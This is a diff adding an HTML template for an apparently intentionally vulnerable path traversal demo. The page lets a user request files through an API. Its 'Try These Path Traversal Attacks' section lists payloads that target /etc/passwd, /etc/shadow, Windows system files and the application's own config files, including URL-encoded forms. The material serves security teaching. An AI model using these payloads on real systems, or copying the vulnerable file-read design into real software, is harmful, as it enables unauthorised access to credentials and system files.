@@ -1,0 +1,161 @@
+<!DOCTYPE html>
+<html xmlns:th="http://www.thymeleaf.org">
+<head>
+    <meta charset="UTF-8">
+    <title>File Reader - Path Traversal Demo</title>
+    <style>
+        * { margin: 0; padding: 0; box-sizing: border-box; }
+        body {
+            font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif;
+            background: linear-gradient(135deg, #1a1a2e 0%, #16213e 100%);
+            min-height: 100vh;
+            color: #fff;
+            padding: 40px;
+        }
+        .container { max-width: 1000px; margin: 0 auto; }
+        h1 { color: #ff6b6b; margin-bottom: 30px; }
+        .file-box {
+            background: rgba(255,255,255,0.05);
+            padding: 30px;
+            border-radius: 15px;
+            margin-bottom: 30px;
+        }
+        input[type="text"] {
+            width: 70%;
+            padding: 15px;
+            border: none;
+            border-radius: 8px;
+            background: rgba(0,0,0,0.3);
+            color: #fff;
+            font-size: 1em;
+        }
+        button {
+            padding: 15px 30px;
+            background: linear-gradient(90deg, #ff4444, #ff8800);
+            border: none;
+            border-radius: 8px;
+            color: #fff;
+            font-weight: bold;
+            cursor: pointer;
+            margin-left: 10px;
+        }
+        .output {
+            background: #0d1117;
+            padding: 20px;
+            border-radius: 10px;
+            margin-top: 20px;
+            font-family: 'Courier New', monospace;
+            white-space: pre-wrap;
+            color: #00ff88;
+            max-height: 400px;
+            overflow-y: auto;
+        }
+        .path-display {
+            background: rgba(255,136,0,0.2);
+            padding: 15px;
+            border-radius: 8px;
+            margin-top: 15px;
+            font-family: monospace;
+            color: #ff8800;
+            border: 1px solid #ff8800;
+        }
+        .attack-examples {
+            background: rgba(255,68,68,0.1);
+            border: 1px solid #ff4444;
+            padding: 20px;
+            border-radius: 10px;
+            margin-top: 30px;
+        }
+        .attack-examples h3 { color: #ff4444; margin-bottom: 15px; }
+        .attack-examples code {
+            display: block;
+            background: #0d1117;
+            padding: 10px;
+            margin: 5px 0;
+            border-radius: 5px;
+            color: #00ff88;
+        }
+        .back-link {
+            display: inline-block;
+            margin-bottom: 20px;
+            color: #00ccff;
+            text-decoration: none;
+        }
+    </style>
+</head>
+<body>
+    <div class="container">
+        <a href="/" class="back-link">← Back to Home</a>
+        <h1>📁 Path Traversal Demo - File Reader</h1>
+
+        <div class="file-box">
+            <h3>Read a File</h3>
+            <p style="color: #888; margin: 10px 0;">Enter a filename from the uploads directory:</p>
+            <input type="text" id="fileInput" placeholder="Enter filename (e.g., readme.txt)">
+            <button onclick="readFile()">Read File</button>
+
+            <div class="path-display" id="pathDisplay" style="display: none;">
+                <strong>Resolved Path:</strong> <span id="pathText"></span>
+            </div>
+
+            <div class="output" id="outputBox" style="display: none;"></div>
+        </div>
+
+        <div class="attack-examples">
+            <h3>⚠️ Try These Path Traversal Attacks:</h3>
+            <p style="color: #aaa; margin-bottom: 15px;">These payloads will access files outside the uploads directory:</p>
+
+            <p><strong>Windows Path Traversal:</strong></p>
+            <code>..\..\..\..\..\Windows\System32\drivers\etc\hosts</code>
+            <code>..\..\..\..\Windows\win.ini</code>
+            <code>..\..\..\..\..\Users\Public\Desktop\desktop.ini</code>
+
+            <p style="margin-top: 20px;"><strong>Linux/Mac Path Traversal:</strong></p>
+            <code>../../../../../etc/passwd</code>
+            <code>../../../../../etc/shadow</code>
+            <code>../../../../../etc/hosts</code>
+            <code>../../../../../var/log/syslog</code>
+
+            <p style="margin-top: 20px;"><strong>Application Files:</strong></p>
+            <code>../pom.xml</code>
+            <code>../src/main/resources/application.properties</code>
+
+            <p style="margin-top: 20px;"><strong>URL Encoded:</strong></p>
+            <code>..%2F..%2F..%2F..%2Fetc%2Fpasswd</code>
+            <code>..%5C..%5C..%5C..%5CWindows%5Cwin.ini</code>
+        </div>
+    </div>
+
+    <script>
+        async function readFile() {
+            const filename = document.getElementById('fileInput').value;
+            const pathDisplay = document.getElementById('pathDisplay');
+            const pathText = document.getElementById('pathText');
+            const outputBox = document.getElementById('outputBox');
+
+            if (!filename) {
+                alert('Please enter a filename');
+                return;
+            }
+
+            pathDisplay.style.display = 'block';
+            outputBox.style.display = 'block';
+            outputBox.textContent = 'Reading file...';
+
+            try {
+                const response = await fetch(`/api/files?filename=${encodeURIComponent(filename)}`);
+                const data = await response.json();
+
+                pathText.textContent = data.path || 'Unknown';
+                outputBox.textContent = data.content || data.error || 'No content';
+            } catch (error) {
+                outputBox.textContent = 'Error: ' + error.message;
+            }
+        }
+
+        document.getElementById('fileInput').addEventListener('keypress', function(e) {
+            if (e.key === 'Enter') readFile();
+        });
+    </script>
+</body>
+</html>
